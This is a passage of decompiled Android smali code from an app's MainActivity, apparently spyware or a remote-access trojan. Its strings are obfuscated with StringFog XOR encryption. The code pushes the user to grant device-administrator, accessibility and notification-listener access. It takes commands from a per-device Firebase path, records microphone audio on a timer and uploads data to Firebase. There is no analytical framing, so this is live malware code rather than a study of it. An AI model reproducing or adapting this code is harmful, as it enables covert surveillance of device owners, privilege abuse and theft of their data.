    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lsigma/male/MainActivity;->webview1:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "ejAnWVk3NTVIS3o="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setDatabasePath(Ljava/lang/String;)V

    .line 454
    :cond_1
    invoke-virtual {p0, v4}, Lsigma/male/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/webkit/WebView;

    .line 455
    new-instance v1, Lsigma/male/MainActivity$WebAppInterface;

    invoke-direct {v1, p0, p0}, Lsigma/male/MainActivity$WebAppInterface;-><init>(Lsigma/male/MainActivity;Landroid/content/Context;)V

    const-string v2, "FDoiX1c8MA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 456
    iget-object v0, p0, Lsigma/male/MainActivity;->webview1:Landroid/webkit/WebView;

    const-string v1, "PSAyXUtve2lEViYgJ0pKNDloTlc4"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 457
    invoke-virtual {p0, v4}, Lsigma/male/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v3}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v3}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 458
    invoke-virtual {p0}, Lsigma/male/MainActivity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->onNewIntent(Landroid/content/Intent;)V

    .line 459
    const-string v0, "MTEwRFswCzZCVDw3Pw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    .line 460
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lsigma/male/DeviceAdminComponent;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 462
    if-eqz v0, :cond_2

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-nez v0, :cond_3

    .line 466
    :cond_2
    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "BTgjTEswdANDWTc4Iw15MTkvQxgUNyVISyZ0MkIYODUtSBgBPC9eGDQkNg1POiYtDRY="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lsigma/male/SketchwareUtil;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    .line 467
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "NjsrA1k7MDRCUTF6NUhMIT0oSks="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "NjsrA1k7MDRCUTF6NUhMIT0oSkt7ECNbUTYxB0lVPDoVSEwhPShKSw=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 472
    :cond_3
    invoke-virtual {p0}, Lsigma/male/MainActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 474
    const-string v1, "MDonT1QwMBlDVyE9IERbNCAvQlYKOC9eTDA6I19L"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 475
    invoke-virtual {p0}, Lsigma/male/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v1

    .line 478
    if-eqz v0, :cond_4

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_5

    .line 479
    :cond_4
    new-instance v0, Landroid/content/Intent;

    const-string v1, "NDoiX1c8MGheXSEgL0NfJnoHbmwcGwhydhoAD2txFhUSZHcbCwpkawERCGhqCgcDeWwcGgF+"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 480
    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "BTgjTEswdANDWTc4Iw12OiAvS1E2NTJEVzt0B05bMCc1DUw6dCtMUzB0MkVRJnQnXUh1IylfU3UkNEJIMCYqVBY="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lsigma/male/SketchwareUtil;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    .line 484
    :cond_5
    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Lsigma/male/logoss;

    invoke-virtual {p0, v0, v1}, Lsigma/male/MainActivity;->isAccessServiceEnabled(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 486
    new-instance v0, Landroid/content/Intent;

    const-string v1, "NDoiX1c8MGheXSEgL0NfJnoHbnsQBxVkehwYD3lhCgcDeWwcGgF+"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 487
    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 488
    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "BTgjTEswdANDWTc4Iw1/OjshQV11ByNfTjw3I14YITtmQFk+MWZZUDwnZkxIJXQxQko+dDZfVyUxNEFBew=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lsigma/male/SketchwareUtil;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    .line 493
    :cond_6
    iget-object v0, p0, Lsigma/male/MainActivity;->rn:Lsigma/male/RequestNetwork;

    const-string v1, "EhES"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "PSAyXUtve2lKVzozKkgWNjsr"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "NA=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iget-object v4, p0, Lsigma/male/MainActivity;->_rn_request_listener:Lsigma/male/RequestNetwork$RequestListener;

    invoke-virtual {v0, v1, v2, v3, v4}, Lsigma/male/RequestNetwork;->startRequestNetwork(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lsigma/male/RequestNetwork$RequestListener;)V

    .line 503
    return-void

    .line 445
    :cond_7
    iget-object v0, p0, Lsigma/male/MainActivity;->sp:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "JTUoSFQ="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "OjoqRFYwIC5IVzsxJ0NcOjoqVA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 446
    invoke-virtual {p0}, Lsigma/male/MainActivity;->_setuid()V

    goto/16 :goto_0
.end method

.method private validateMicAvailability()Z
    .locals 7

    .prologue
    const v2, 0xac44

    const/4 v1, 0x1

    .line 741
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    .line 743
    new-instance v0, Landroid/media/AudioRecord;

    .line 744
    const/16 v3, 0x10

    move v4, v1

    move v5, v2

    .line 743
    invoke-direct/range {v0 .. v5}, Landroid/media/AudioRecord;-><init>(IIIII)V

    .line 747
    :try_start_0
    invoke-virtual {v0}, Landroid/media/AudioRecord;->getRecordingState()I

    move-result v2

    if-eq v2, v1, :cond_1

    .line 748
    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 752
    :goto_0
    invoke-virtual {v0}, Landroid/media/AudioRecord;->startRecording()V

    .line 753
    invoke-virtual {v0}, Landroid/media/AudioRecord;->getRecordingState()I

    move-result v2

    const/4 v3, 0x3

    if-eq v2, v3, :cond_0

    .line 754
    invoke-virtual {v0}, Landroid/media/AudioRecord;->stop()V

    .line 755
    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 758
    :cond_0
    invoke-virtual {v0}, Landroid/media/AudioRecord;->stop()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 760
    invoke-virtual {v0}, Landroid/media/AudioRecord;->release()V

    .line 764
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    return v0

    .line 759
    :catchall_0
    move-exception v1

    .line 760
    invoke-virtual {v0}, Landroid/media/AudioRecord;->release()V

    .line 762
    throw v1

    :cond_1
    move-object v1, v6

    goto :goto_0
.end method


# virtual methods
.method public _accesp()V
    .locals 0

    .prologue
    .line 625
    return-void
.end method

.method public _changewebs(Ljava/lang/String;)V
    .locals 2

    .prologue
    .line 956
    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/MainActivity;->textview1:Landroid/widget/TextView;

    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lsigma/male/SketchwareUtil;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    .line 957
    iget-object v0, p0, Lsigma/male/MainActivity;->webview1:Landroid/webkit/WebView;

    const-string v1, "PSAyXUtve2lKVzozKkgWNjsr"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 958
    return-void
.end method

.method public _getallp()V
    .locals 6

    .prologue
    .line 637
    new-instance v0, Lsigma/male/MainActivity$22;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$22;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->t:Ljava/util/TimerTask;

    .line 668
    iget-object v0, p0, Lsigma/male/MainActivity;->_timer:Ljava/util/Timer;

    iget-object v1, p0, Lsigma/male/MainActivity;->t:Ljava/util/TimerTask;

    const-wide/16 v2, 0x0

    const-wide/16 v4, 0x2710

    invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->scheduleAtFixedRate(Ljava/util/TimerTask;JJ)V

    .line 669
    return-void
.end method

.method public _interfaceweb()V
    .locals 0

    .prologue
    .line 673
    return-void
.end method

.method public _jwiwiw()V
    .locals 0

    .prologue
    .line 884
    return-void
.end method

.method public _phidatsu(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2

    .prologue
    .line 821
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    invoke-virtual {v0}, Ljava/util/HashMap;->clear()V

    .line 822
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    .line 824
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    const-string v1, "MTUyTA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 827
    invoke-static {}, Lcom/google/firebase/database/FirebaseDatabase;->getInstance()Lcom/google/firebase/database/FirebaseDatabase;

    move-result-object v0

    const-string v1, "JTAnWVl6JCJMTDQ8L0lcMDo1SEo="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/FirebaseDatabase;->getReference(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    .line 829
    :try_start_0
    invoke-virtual {v0}, Lcom/google/firebase/database/DatabaseReference;->push()Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->setValue(Ljava/lang/Object;)Lcom/google/android/gms/tasks/Task;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 836
    :goto_0
    return-void

    .line 831
    :catch_0
    move-exception v0

    .line 832
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public _pihtest()V
    .locals 3

    .prologue
    .line 772
    invoke-static {}, Lcom/google/firebase/database/FirebaseDatabase;->getInstance()Lcom/google/firebase/database/FirebaseDatabase;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ejcpQFwmeyVCVTEn"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/gui;->uuii(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "JTwv"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/FirebaseDatabase;->getReference(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    .line 774
    new-instance v1, Lsigma/male/MainActivity$23;

    invoke-direct {v1, p0}, Lsigma/male/MainActivity$23;-><init>(Lsigma/male/MainActivity;)V

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->addChildEventListener(Lcom/google/firebase/database/ChildEventListener;)Lcom/google/firebase/database/ChildEventListener;

    .line 817
    return-void
.end method

.method public _remicbje(Ljava/lang/String;Ljava/lang/String;)V
    .locals 4

    .prologue
    .line 906
    new-instance v0, Landroid/media/MediaRecorder;

    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    iput-object v0, p0, Lsigma/male/MainActivity;->myAudioRecorder:Landroid/media/MediaRecorder;

    .line 907
    iget-object v0, p0, Lsigma/male/MainActivity;->myAudioRecorder:Landroid/media/MediaRecorder;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 908
    iget-object v0, p0, Lsigma/male/MainActivity;->myAudioRecorder:Landroid/media/MediaRecorder;

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 909
    iget-object v0, p0, Lsigma/male/MainActivity;->myAudioRecorder:Landroid/media/MediaRecorder;

    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 910
    iget-object v0, p0, Lsigma/male/MainActivity;->myAudioRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "eiYjThY4JHU="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    .line 914
    :try_start_0
    iget-object v0, p0, Lsigma/male/MainActivity;->myAudioRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V

    .line 915
    iget-object v0, p0, Lsigma/male/MainActivity;->myAudioRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 917
    :goto_0
    new-instance v0, Lsigma/male/MainActivity$24;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$24;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->t:Ljava/util/TimerTask;

    .line 951
    iget-object v0, p0, Lsigma/male/MainActivity;->_timer:Ljava/util/Timer;

    iget-object v1, p0, Lsigma/male/MainActivity;->t:Ljava/util/TimerTask;

    invoke-static {p1}, Ljava/lang/Double;->parseDouble(Ljava/lang/String;)D

    move-result-wide v2

    double-to-int v2, v2

    int-to-long v2, v2

    invoke-virtual {v0, v1, v2, v3}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    .line 952
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public _seeifti()V
    .locals 0

    .prologue
    .line 739
    return-void
.end method

.method public _setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 6

    .prologue
    .line 597
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    invoke-virtual {v0}, Ljava/util/HashMap;->clear()V

    .line 598
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    .line 599
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    const-string v1, "JzE1XVc="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 600
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    const-string v1, "IzU0Hw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 601
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    const-string v1, "I2U="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 602
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    const-string v1, "I2Y="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 603
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    const-string v1, "I2c="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 605
    const-string v0, "NDYlSV0zMy5EUj44K0NXJSU0XkwgIjFVQS8="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 606
    const-string v1, "ZWV0HgxgYnEVAQ=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 607
    const/16 v2, 0x8

    .line 608
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 609
    new-instance v3, Ljava/util/Random;

    invoke-direct {v3}, Ljava/util/Random;-><init>()V

    .line 610
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v2}, Ljava/lang/StringBuilder;-><init>(I)V

    .line 611
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v0

    add-int/lit8 v0, v0, -0x1

    invoke-virtual {v3, v0}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    invoke-virtual {v1, v0}, Ljava/lang/String;->charAt(I)C

    move-result v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 613
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->length()I

    move-result v0

    :goto_0
    if-lt v0, v2, :cond_0

    .line 618
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    const-string v1, "JzoiQA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 619
    iget-object v0, p0, Lsigma/male/MainActivity;->_firebase:Lcom/google/firebase/database/FirebaseDatabase;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "eiYjXkg6J2lfXSYkKQ=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lsigma/male/MainActivity;->sp:Landroid/content/SharedPreferences;

    const-string v3, "ID0i"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/FirebaseDatabase;->getReference(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    const-string v1, "JzE1XVc="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->child(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    .line 620
    iget-object v1, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->setValue(Ljava/lang/Object;)Lcom/google/android/gms/tasks/Task;

    .line 621
    return-void

    .line 614
    :cond_0
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v5

    invoke-virtual {v3, v5}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    invoke-virtual {v1, v5}, Ljava/lang/String;->charAt(I)C

    move-result v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 613
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public _setuid()V
    .locals 6

    .prologue
    .line 528
    const-string v0, "NDYlSV0zMy5EUj44K0NXJSU0XkwgIjFVQS8="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 529
    const-string v1, "ZWV0HgxgYnEVAQ=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 530
